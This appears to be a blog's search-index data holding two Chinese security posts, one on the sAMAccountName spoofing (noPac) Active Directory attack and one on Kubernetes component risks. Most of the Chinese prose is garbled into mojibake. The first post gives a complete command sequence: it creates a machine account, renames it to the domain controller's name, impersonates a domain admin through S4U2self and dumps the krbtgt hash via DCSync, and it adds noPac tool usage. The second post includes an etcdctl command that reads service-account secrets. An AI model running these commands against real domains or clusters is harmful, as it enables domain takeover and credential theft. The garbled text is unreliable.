TGTç¥¨æ®ã€‚è¯¥æ¼æ´çš„æ ¸å¿ƒä¸ºï¼šå½“è¯·æ±‚çš„æœåŠ¡ç¥¨ ST æ²¡æœ‰è¢« KDC æ‰¾åˆ°æ—¶ï¼ŒKDC ä¼šè‡ªåŠ¨åœ¨å°¾éƒ¨æ·»åŠ  $ é‡æ–°æœç´¢ã€‚ å¦‚æœ A ç”¨æˆ·è·å¾—ç”³è¯·äº† TGTï¼Œç„¶ååˆ é™¤ A ç”¨æˆ·æˆ–é‡å‘½å A ç”¨æˆ·ã€‚å¹¶ä½¿ç”¨è¯¥ TGT è¿›è¡Œ S4U2self ä»¥å…¶å®ƒç”¨æˆ·èº«ä»½è¯·æ±‚ä¸€å¼  ST ç»™ä»–è‡ªå·±ï¼Œå¯¼è‡´ KDC åœ¨ Account Database ä¸­å¯»æ‰¾ A$ã€‚å¦‚æœå¸æˆ· A$ å­˜åœ¨ï¼Œé‚£ä¹ˆ A å°±ä¼šåƒå…¶ä»–ç”¨æˆ·ä¸€æ ·ä¸º A$è·å¾—ä¸€å¼ æœåŠ¡ç¥¨æ®ã€‚ å› æ­¤ï¼Œæœºå™¨è´¦æˆ·æ”¹åä¸ºå’Œ DC æœºå™¨è´¦æˆ·ä¸€æ ·ï¼Œç„¶åç”³è¯· TGTï¼Œæ¥ç€æŠŠç”¨æˆ·åä¿®æ”¹æ‰ï¼Œä½¿å¾— DC åœ¨ TGS_REP æ—¶å€™æ‰¾ä¸åˆ°è¯¥è´¦æˆ·ï¼Œè¿™æ—¶ä¼šç”¨è‡ªå·±çš„å¯†é’¥åŠ å¯†æœåŠ¡ç¥¨æ® STï¼Œç„¶åå°±æ˜¯å¾—åˆ°äº†ä¸€ä¸ªé«˜æƒé™ STã€‚ ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 sAMAccountName æ ¹æ®å¾®è½¯å®˜æ–¹æ–‡æ¡£ä¸­çš„å®šä¹‰ï¼š SAM-Account-Name ç”¨äºæ”¯æŒè¿è¡Œæ—©æœŸç‰ˆæœ¬æ“ä½œç³»ç»Ÿçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„ç™»å½•åï¼Œä¾‹å¦‚ Windows NT 4.0ã€Windows 95ã€Windows 98 å’Œ LAN Managerã€‚å®é™…ä¸Šæ˜¯ä»¥ã€ŒDomain\\LogonName ã€å½¢å¼å‘½åã€‚ å…¶ Ldap-Display-Name ä¸ºï¼šsAMAccountNameã€‚æ•…è¯¥ç»„åˆæ¼æ´åˆè¢«ç§°ä¸ºï¼šsAMAccountName spoofing æ­¤å¤„è¿˜æœ‰ä¸€ç§ç”¨æˆ·å‘½åå±æ€§ï¼Œæ˜¯ç›®å‰åŸŸç¯å¢ƒä¸­å¸¸ç”¨çš„ä¸€ç§ï¼šUPN userPrincipalName å±æ€§æ˜¯ç”¨æˆ·çš„ç™»å½•åã€‚ å±æ€§ç”± UPN (ç”¨æˆ·ä¸»ä½“) ï¼Œè¿™æ˜¯ç”¨æˆ·æœ€å¸¸è§çš„ç™»å½• Windows åç§°ã€‚ ç”¨æˆ·é€šå¸¸ä½¿ç”¨å…¶ UPN ç™»å½•åˆ°åŸŸã€‚ UPN ç”± UPN å‰ç¼€ï¼ˆç”¨æˆ·å¸æˆ·åï¼‰å’Œ UPN åç¼€ï¼ˆDNS åŸŸåï¼‰ç»„æˆã€‚ å‰ç¼€ä¸åç¼€ä»¥ @ ç¬¦å·ç›¸è”æ¥ã€‚UPN å¿…é¡»åœ¨ç›®å½•æ—ä¸­çš„æ‰€æœ‰å®‰å…¨ä¸»ä½“å¯¹è±¡ä¹‹é—´ä¿æŒå”¯ä¸€ã€‚ è¿™æ„å‘³ç€å¯ä»¥é‡å¤ä½¿ç”¨ UPN çš„å‰ç¼€ï¼Œåªæ˜¯ä¸èƒ½ä½¿ç”¨ç›¸åŒçš„åç¼€ã€‚ ä¾‹å¦‚ï¼š åŸŸåï¼špentest.lab SAM-Account-Nameï¼šwin11user NetBIOS ç™»å½•åï¼špentest.lab\\win11user UserPrincipalNameï¼šwin11user@pentest.lab ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.4 SAM-Account-Type SAM-Account-Type åŒ…å«äº†åŸŸå†…å¸æˆ·ç±»å‹å¯¹è±¡çš„ä¿¡æ¯ã€‚å¯ä»¥æšä¸¾å¸æˆ·ç±»å‹çš„åˆ—è¡¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ˜¾ç¤ºä¿¡æ¯ API æ¥åˆ›å»ºåˆ—è¡¨ã€‚ç”±äºè®¡ç®—æœºã€æ™®é€šç”¨æˆ·å¸æˆ·å’Œä¿¡ä»»å¸æˆ·è¿˜å¯ä»¥æšä¸¾ä¸ºç”¨æˆ·å¯¹è±¡ã€‚ ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 æ¼æ´å¤ç° å‰æï¼šéœ€è¦å¯¹å±æ€§ sAMAccountName å’Œ servicePrincipalName å…·æœ‰å†™æƒé™ã€‚ç”±äºé»˜è®¤æƒ…å†µä¸‹ MAQ ç‰¹æ€§ï¼ŒåŸŸå†…æ™®é€šç”¨æˆ·å¯ä»¥åˆ›å»º 10 ä¸ªæœºå™¨è´¦æˆ·ï¼Œè€Œåˆ›å»ºè€…å¯¹äºæœºå™¨è´¦æˆ·å…·æœ‰å†™æƒé™ï¼Œå½“ç„¶å¯ä»¥æ›´æ”¹è¿™ä¸¤ä¸ªå±æ€§ã€‚ é¦–å…ˆåˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œä½¿ç”¨ impacket çš„ addcomputer.py æˆ–æ˜¯ powermad æŠ€å·§ addcomputer.py æ˜¯åˆ©ç”¨ SAMRåè®® åˆ›å»ºæœºå™¨è´¦æˆ·ï¼Œè¿™ä¸ªæ–¹æ³•æ‰€åˆ›å»ºçš„æœºå™¨è´¦æˆ·æ²¡æœ‰ SPNï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨æ¸…é™¤ã€‚ ç„¶åæ¸…é™¤æœºå™¨è´¦æˆ·çš„ servicePrincipalName å±æ€§ å°†æœºå™¨è´¦æˆ·çš„ sAMAccountNameï¼Œæ›´æ”¹ä¸º DC çš„æœºå™¨è´¦æˆ·åå­—ï¼Œæ³¨æ„åç¼€ä¸å¸¦ $ ä¸ºæœºå™¨è´¦æˆ·è¯·æ±‚ TGT å°†æœºå™¨è´¦æˆ·çš„ sAMAccountName æ›´æ”¹ä¸ºå…¶ä»–åå­—ï¼Œä¸ä¸æ­¥éª¤ 3 é‡å¤å³å¯ é€šè¿‡ S4U2self åè®®å‘ DC è¯·æ±‚ ST DCsync æ­¥éª¤å¦‚ä¸‹ï¼š # 0. create a computer account addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword' # 1. clear its SPNs addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController # 2. rename the computer (computer -\u003e DC) renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password' # 3. obtain a TGT getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword' # 4. reset the computer name renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password' # 5. obtain a service ticket with S4U2self by presenting the previous TGT KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' # 6. DCSync by presenting the service ticket KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local' æ­¦å™¨åŒ–å·¥å…·åœ°å€ï¼šhttps://github.com/cube0x0/noPac æ‰«æï¼šnoPac.exe scan -domain pentest.lab -user win11user -pass P@ssword åˆ©ç”¨ï¼š noPac.exe scan -domain pentest.lab -user win11user -pass P@ssword /dc dc.pentest. lab /mAccount demol /mPassword pAss123! /service cifs /ptt æŸ¥çœ‹å†…å­˜ä¸­çš„ç¥¨æ®ï¼Œå‘ç°å·²ç»å­˜åœ¨ dc çš„ cifs æœåŠ¡ç¥¨æ®ï¼š Dcsyncï¼š ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 ç¼“è§£æªæ–½ å¾®è½¯å®˜æ–¹å·²æ¨å‡ºè¡¥ä¸ï¼šKB5008602ã€KB5008380 é€šè¿‡åŸŸæ§çš„ ADSI ç¼–è¾‘å™¨å·¥å…·å°† AD åŸŸçš„ MAQ é…ç½®ä¸º 0ï¼Œä¸­æ–­æ­¤æ¼æ´çš„åˆ©ç”¨é“¾ï¼ˆä½†å¦‚æœå½“å‰ç”¨æˆ·å¯¹åŸŸå†…æŸå°æœºå™¨è´¦å·æ‹¥æœ‰ GenericALLã€GenericWriteã€WriteProperty æƒé™ä»èƒ½ä¿®æ”¹ SAMAccountName å±æ€§ï¼‰ï¼Œå…·ä½“æŸ¥è¯¢æ–¹å¼å¦‚ä¸‹ï¼š # åˆ—å‡ºæ‰€æœ‰æœºå™¨è´¦å· Get-ADComputer -Filter * -Property * | Format-Table Name,OperatingSystem,OperatingSystemServicePack,OperatingSystemVersion -Wrap -Auto # æƒé™æŸ¥è¯¢ Get-DomainObjectAcl ControlledComputer -ResolveGUIDs |?{$_.securityidentifier -eq (get-domainuser win11user).objectsid} ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å‚è€ƒ https://tttang.com/archive/1380/ https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"å®¹å™¨ç¼–æ’å¹³å°çš„é£é™©åˆ†æ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"K8s å®‰å…¨ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:0:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1 èƒŒæ™¯ Kubernetesï¼Œç®€ç§°ä¸º K8sï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨åŒ–åº”ç”¨è‡ªåŠ¨éƒ¨ç½²ã€ä¼¸ç¼©å’Œç®¡ç†å¹³å°ï¼Œå·²ç»æˆä¸ºå®¹å™¨ç¼–æ’çš„äº‹å®æ ‡å‡†ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:1:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.1 Kubernetes ä¸€ä¸ª Kubernetes é›†ç¾¤åŒ…å«è‹¥å¹²å°æœåŠ¡å™¨ã€‚å…¶ä¸­ï¼Œç”¨äºè¿è¡Œå®¹å™¨åŒ–åº”ç”¨çš„æœåŠ¡å™¨è¢«ç§°ä¸ºå·¥ä½œèŠ‚ç‚¹ï¼ˆworker nodeï¼‰ï¼› ç”¨äºè¿è¡Œæ§åˆ¶å¹³é¢ï¼ˆcontrol planeï¼‰ç»„ä»¶çš„æœåŠ¡å™¨è¢«ç§°ä¸ºæ§åˆ¶èŠ‚ç‚¹æˆ–ä¸»èŠ‚ç‚¹ï¼ˆmaster nodeï¼‰ã€‚ åœ¨è®¡ç®—èµ„æºå……è¶³çš„æƒ…å†µä¸‹ï¼Œå·¥ä½œèŠ‚ç‚¹å’Œæ§åˆ¶èŠ‚ç‚¹å¹¶ä¸é‡åˆï¼Œæ§åˆ¶å¹³é¢ç»„ä»¶åªè¿è¡Œåœ¨æ§åˆ¶èŠ‚ç‚¹ä¸Šï¼Œä¸šåŠ¡å®¹å™¨è¿è¡Œåœ¨å·¥ä½œèŠ‚ç‚¹ä¸Šï¼Œä»¥æ»¡è¶³é«˜å¯ç”¨çš„éœ€æ±‚ã€‚ç„¶è€Œï¼Œä¸ºäº†è¾¾åˆ°å……åˆ†åˆ©ç”¨æœåŠ¡å™¨èµ„æºçš„ç›®çš„ï¼ˆæˆ–å•èŠ‚ç‚¹é›†ç¾¤çš„æƒ…å†µï¼‰ï¼Œæœ‰æ—¶ä¹Ÿä¼šå…è®¸æ§åˆ¶èŠ‚ç‚¹ä¸Šè¿è¡Œä¸šåŠ¡å®¹å™¨ã€‚ å…¶ä¸­ï¼ŒMaster Node ä¸­åŒ…å«ï¼š API Server è¿™æ˜¯ Kubernetes æ§åˆ¶é¢æ¿ä¸­å”¯ä¸€å¸¦æœ‰ç”¨æˆ·å¯è®¿é—® API ä»¥åŠç”¨æˆ·å¯äº¤äº’çš„ç»„ä»¶ã€‚API æœåŠ¡å™¨ä¼šæš´éœ²ä¸€ä¸ª RESTful çš„ Kubernetes API å¹¶ä½¿ç”¨ JSON æ ¼å¼çš„æ¸…å•æ–‡ä»¶(manifest files)ã€‚ etcd è¿™æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ã€ç¨³å®šçš„ã€é«˜å¯ç”¨çš„é”®å€¼å­˜å‚¨ï¼Œè¢« Kubernetes ç”¨äºé•¿ä¹…å‚¨å­˜æ‰€æœ‰çš„ API å¯¹è±¡ã€‚ Controller Manager è¢«ç§°ä¸ºâ€œkube-controller managerâ€ï¼Œå®ƒè¿è¡Œç€æ‰€æœ‰å¤„ç†é›†ç¾¤æ—¥å¸¸ä»»åŠ¡çš„æ§åˆ¶å™¨ã€‚åŒ…æ‹¬äº†èŠ‚ç‚¹æ§åˆ¶å™¨ã€å‰¯æœ¬æ§åˆ¶å™¨ã€ç«¯ç‚¹(endpoint)æ§åˆ¶å™¨ä»¥åŠæœåŠ¡è´¦æˆ·ç­‰ã€‚ Scheduler è°ƒåº¦å™¨ä¼šç›‘æ§æ–°å»ºçš„ pods(ä¸€ç»„æˆ–ä¸€ä¸ªå®¹å™¨)å¹¶å°†å…¶åˆ†é…ç»™èŠ‚ç‚¹ã€‚ åœ¨ Worker Node ä¸­åŒ…å«ï¼š Kubelet è´Ÿè´£è°ƒåº¦åˆ°å¯¹åº”èŠ‚ç‚¹çš„ Pod çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œæ‰§è¡Œä»»åŠ¡å¹¶å°† Pod çŠ¶æ€æŠ¥å‘Šç»™ä¸»èŠ‚ç‚¹çš„æ¸ é“ï¼Œé€šè¿‡å®¹å™¨è¿è¡Œæ—¶(æ‹‰å–é•œåƒã€å¯åŠ¨å’Œåœæ­¢å®¹å™¨ç­‰)æ¥è¿è¡Œè¿™äº›å®¹å™¨ã€‚å®ƒè¿˜ä¼šå®šæœŸæ‰§è¡Œè¢«è¯·æ±‚çš„å®¹å™¨çš„å¥åº·æ¢æµ‹ç¨‹åºã€‚ kube-proxy å®ƒè´Ÿè´£èŠ‚ç‚¹çš„ç½‘ç»œï¼Œåœ¨ä¸»æœºä¸Šç»´æŠ¤ç½‘ç»œè§„åˆ™å¹¶æ‰§è¡Œè¿æ¥è½¬å‘ã€‚å®ƒè¿˜è´Ÿè´£å¯¹æ­£åœ¨æœåŠ¡ çš„ pods è¿›è¡Œè´Ÿè½½å¹³è¡¡ã€‚ åœ¨ç»¿ç›Ÿçš„é’ˆå¯¹å®¹å™¨çš„æ¸—é€æµ‹è¯•æ–¹æ³•ä¸€æ–‡ä¸­æŒ‡å‡ºä¸€äº›æ¸—é€æµ‹è¯•æ€è·¯å’Œæ–¹æ³•ã€‚ç»“åˆä¸€èˆ¬çš„æ¸—é€è¿‡ç¨‹ï¼Œæ¢³ç†å‡ºä¸€ä¸ªé’ˆå¯¹ Kubernetes çš„æ¸—é€æµ‹è¯•æµç¨‹ï¼š Kubernetes æ§åˆ¶å¹³é¢ç»„ä»¶é€šå¸¸è¿è¡Œåœ¨æ§åˆ¶èŠ‚ç‚¹ä¸Šï¼›å¦å¤–ï¼Œå¯¹å®¹å™¨é€ƒé€¸åé€šå¸¸èƒ½å¤Ÿè·å¾—å®¹å™¨æ‰€åœ¨å®¿ä¸»æœºä¸Šçš„ root æƒé™ã€‚å°†è¿™ä¸¤ç‚¹ç»“åˆèµ·æ¥æˆ‘ä»¬ä¼šå‘ç°ï¼Œå¦‚æœå‰æœŸè¿›è¡Œ Web æ¸—é€çš„ç›®æ ‡å®¹å™¨ä½äºæ§åˆ¶èŠ‚ç‚¹ä¸Šï¼Œä¸”æˆåŠŸä»å®¹å™¨ä¸­é€ƒé€¸ï¼Œé‚£ä¹ˆæˆ‘ä»¬å®é™…ä¸Šèƒ½å¤Ÿå‡­å€Ÿæ§åˆ¶èŠ‚ç‚¹ä¸Šçš„ Kubernetes ç®¡ç†å‘˜å‡­è¯ï¼ˆkubeconfigï¼‰ä¸ Kubernetes API Server è¿›è¡Œäº¤äº’ï¼ˆç”šè‡³å¯ä»¥ç›´æ¥ä½¿ç”¨æ§åˆ¶èŠ‚ç‚¹ä¸Šçš„ kubectl å‘½ä»¤è¡Œå·¥å…·ï¼‰ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:1:1","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.2 ç»„ä»¶æ¥å£å­˜åœ¨çš„é£é™© k8s ä¸­çš„å¤§å¤šæ•°ç»„ä»¶ä»¥ HTTP å’Œ HTTPS çš„ API å½¢å¼æä¾›æœåŠ¡ï¼Œå¸¸è§ç«¯å£å¦‚ä¸‹ï¼š ç»„ä»¶ é»˜è®¤ç«¯å£ è¯´æ˜ API Server 6443 åŸºäº HTTP çš„å®‰å…¨ç«¯å£ API Server 8080 ä¸å®‰å…¨çš„ HTTP ç«¯å£ Kubelet 10248 æ£€æŸ¥å¥åº·çŠ¶æ€çš„ç«¯å£ Kubelet 10250 é¢å‘ API Server æä¾›æœåŠ¡çš„ HTTPS ç«¯å£ Dashboard 8001 æä¾› HTTP æœåŠ¡çš„ç«¯å£ etcd 2379 å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„ç«¯å£ etcd 2380 ä¸åŒæœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„ç«¯å£ 1.2.1 API Server é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPI Server åœ¨ 8080 å’Œ 6443 ä¸¤ä¸ªç«¯å£ä¸Šæä¾›æœåŠ¡ã€‚ å…¶ä¸­ï¼Œ8080 ç«¯å£æä¾›çš„æ˜¯æ²¡æœ‰ TLS åŠ å¯†çš„ HTTP æœåŠ¡ï¼Œä¸”æ‰€æœ‰åˆ°è¾¾è¯¥ç«¯å£çš„è¯·æ±‚å°†ç»•è¿‡æ‰€æœ‰è®¤è¯å’Œæˆæƒæ¨¡å—ï¼ˆä½†æ˜¯ä»ç„¶ä¼šè¢«å‡†å…¥æ§åˆ¶æ¨¡å—å¤„ç†ï¼‰ã€‚ä¿ç•™è¯¥ç«¯å£ä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ä»¥åŠé›†ç¾¤åˆå¯åŠ¨ã€‚ ç„¶è€Œåœ¨ç”Ÿäº§ç¯å¢ƒå¼€æ”¾ 8080 ç«¯å£ï¼Œå³ä½¿ç»‘å®šæœ¬åœ°ç¯å›åœ°å€ä¹Ÿæ˜¯å¾ˆå±é™©çš„ã€‚å¦‚æœå°†è¯¥ç«¯å£æš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œé‚£ä¹ˆä»»ä½•ç½‘ç»œå¯è¾¾çš„æ”»å‡»è€…éƒ½èƒ½å¤Ÿé€šè¿‡è¯¥ç«¯å£ç›´æ¥ä¸ API Server äº¤äº’ï¼Œç»§è€Œæ§åˆ¶æ•´ä¸ªé›†ç¾¤ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œ6443 ç«¯å£æä¾›çš„æ˜¯ä½¿ç”¨ TLS åŠ å¯†çš„ HTTPS æœåŠ¡ï¼Œåˆ°è¾¾çš„è¯·æ±‚å¿…é¡»é€šè¿‡è®¤è¯å’Œæˆæƒæœºåˆ¶æ‰èƒ½å¤Ÿè¢«æˆåŠŸå¤„ç†ã€‚åœ¨è®¤è¯å’Œæˆæƒæœºåˆ¶é…ç½®æ­£ç¡®çš„æƒ…å†µä¸‹ï¼Œ6443 ç«¯å£æä¾›çš„æœåŠ¡å®‰å…¨æ€§ä¼šæ›´é«˜ã€‚ 1.2.2 Dashboard åœ¨æŒ‰ç…§å®˜æ–¹æ–‡æ¡£æ‰€ç»™æ–¹å¼éƒ¨ç½²å®Œæˆ Dashboard åï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ‰§è¡Œ kube proxyï¼Œç„¶åæ‰èƒ½é€šè¿‡æœ¬åœ° 8001 ç«¯å£è®¿é—® Dashboardã€‚ä½†æ˜¯ï¼Œå¦‚æœç›´æ¥å°† Dashboard ç«¯å£æ˜ å°„åœ¨å®¿ä¸»æœºèŠ‚ç‚¹ä¸Šï¼Œæˆ–è€…åœ¨æ‰§è¡Œ kube proxy æŒ‡å®šäº†é¢å¤–çš„åœ°å€å‚æ•°ï¼Œé‚£ä¹ˆæ‰€æœ‰èƒ½å¤Ÿè®¿åˆ°å®¿ä¸»æœºçš„ç”¨æˆ·ï¼Œéƒ½èƒ½å¤Ÿç›´æ¥è®¿é—® Dashboardã€‚ # å­˜åœ¨é£é™©çš„é…ç½®æ–¹å¼ kube proxy --address 0.0.0.0 --accept-host='^*$' å¦å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ Dashboard éœ€è¦ç™»å½•è®¤è¯ï¼Œä½†æ˜¯ï¼Œå¦‚æœç”¨æˆ·åœ¨ Dashboard çš„å¯åŠ¨å‚æ•°ä¸­æ·»åŠ äº† --enable-skip-login é€‰é¡¹ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±èƒ½å¤Ÿç›´æ¥ç‚¹å‡» Dashboard ç•Œé¢çš„â€œè·³è¿‡â€ï¼ŒæŒ‰é’®ï¼Œæ— é¡»ç™»å½•ä¾¿å¯ç›´æ¥è¿›å…¥ Dashboardã€‚ 1.2.3 Kubelet API Server æ˜¯æ•´ä¸ª Kubernetes çš„ä¸­æ¢ï¼Œä»¥ RESTful API çš„å½¢å¼å¯¹å¤–æä¾›äº†å¤§é‡åº”ç”¨æ¥å£ã€‚ äº‹å®ä¸Šï¼ŒKubelet ä¹Ÿæä¾›äº† RESTful API æœåŠ¡ï¼Œä¾› API Server è°ƒç”¨ä»¥è·å–æˆ–æ”¹å˜æŸä¸ª Kubernetes èŠ‚ç‚¹ä¸Šçš„èµ„æºçŠ¶æ€ã€‚ç„¶è€Œï¼Œè¿™äº› API çš„è®¾è®¡æ„å›¾å¹¶éæ˜¯å¯¹å¤–æœåŠ¡ï¼Œå› æ­¤å®˜æ–¹å¹¶æ²¡æœ‰ç»™å‡º Kubelet çš„ API æ–‡æ¡£ã€‚ é»˜è®¤é…ç½®ä¸‹ï¼ŒKubelet åœ¨ 10250 ç«¯å£å¼€æ”¾ä¸Šè¿° API æœåŠ¡ï¼Œå¦å¤–è¿˜ç›‘å¬ 10248 ç«¯å£ï¼Œä»¥ä¾› å…¶å®ƒç»„ä»¶æ£€æŸ¥ Kubelet çš„è¿è¡ŒçŠ¶æ€ï¼š curl http://localhost:10248/healthz 10248 ç«¯å£çš„æœåŠ¡ç›¸å¯¹ç®€å•ï¼Œä¸å­˜åœ¨ç‰¹åˆ«çš„é£é™©ã€‚ä½†10250 ç«¯å£å´å­˜åœ¨ä¸€å®šé£é™©ã€‚é»˜è®¤æƒ…å†µä¸‹ API Server åœ¨è®¿é—® Kubelet çš„API æ—¶éœ€è¦ä½¿ç”¨å®¢æˆ·ç«¯è¯ä¹¦ï¼Œç›¸å¯¹æ¥è¯´æ˜¯æ¯”è¾ƒå®‰å…¨çš„ã€‚ä½†æ˜¯å¦‚æœå‡ºç°ä»¥ä¸‹ä»»ä¸€æƒ…å†µï¼š æ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼è·å–äº† API Server è®¿é—® Kubelet çš„å®¢æˆ·ç«¯è¯ä¹¦ã€‚ ç”¨æˆ·ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œå°† Kubelet çš„ --anonymous-auth å‚æ•°è®¾ç½®ä¸º trueï¼Œ ä¸” authorization.mode è®¾ç½®ä¸º AlwaysAllowã€‚ åˆ™ç½‘ç»œå¯è¾¾çš„æ”»å‡»è€…éƒ½èƒ½å¤Ÿç›´æ¥ä¸ Kubelet è¿›è¡Œäº¤äº’ï¼Œä»è€Œå®ç°å¯¹å…¶æ‰€åœ¨èŠ‚ç‚¹çš„æ§åˆ¶ã€‚ 1.2.4 etcd Kubernetes é›†ç¾¤å†…çš„å„ç§èµ„æºåŠå…¶çŠ¶æ€å‡å­˜å‚¨åœ¨ etcd ä¸­ã€‚å¦‚æœèƒ½å¤Ÿæœ‰åŠæ³•è¯»å– etcd ä¸­çš„æ•°æ®ï¼Œå°±å¯èƒ½è·å–é«˜æƒé™ï¼Œä»è€Œæ§åˆ¶é›†ç¾¤ã€‚ ç›®å‰ï¼Œetcd å¯åŠ¨åç›‘å¬ 2379 å’Œ 2380 ä¸¤ä¸ªç«¯å£ï¼Œå‰è€…ç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œåè€…ç”¨äºå¤šä¸ª etcd å®ä¾‹ä¹‹é—´çš„ç«¯å¯¹ç«¯é€šä¿¡ã€‚åœ¨å¤šèŠ‚ç‚¹é›†ç¾¤ä¸­ï¼Œä¸ºäº†å®ç°é«˜å¯ç”¨ï¼Œetcd å¾€å¾€åœ¨èŠ‚ç‚¹ IP ä¸Šè¿›è¡Œç›‘å¬ï¼Œå·²å®ç°å¤šèŠ‚ç‚¹çš„äº’é€šã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªç«¯å£æä¾›çš„æœåŠ¡éƒ½éœ€è¦ç›¸åº”è¯ä¹¦æ‰èƒ½è®¿é—®ï¼Œå¹¶ç¦æ­¢åŒ¿åè®¿é—®ï¼Œæ¥ä¿è¯å®‰å…¨æ€§ã€‚å¦‚æœæ”»å‡»è€…è·å–äº†è¯ä¹¦ï¼Œæˆ–è€…å…è®¸åŒ¿åè®¿é—®ï¼Œå°±å¯ä»¥ç›´æ¥è·å– ectd å†…çš„æ•°æ®ã€‚ etcdctl --endpoints https://localhost:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get /registry/serviceaccounts/kube-system/default -o json ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:1:2","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2 k8s ç»„ä»¶é…ç½®ä¸å½“çš„æ”»å‡»æ¡ˆä¾‹ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.1 API Server æœªæˆæƒè®¿é—® é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPI Server èƒ½å¤Ÿåœ¨ä¸¤ä¸ªç«¯å£ä¸Šå¯¹å¤–æä¾›æœåŠ¡ï¼š8080 å’Œ 6443ï¼Œå‰è€…ä»¥ HTTP 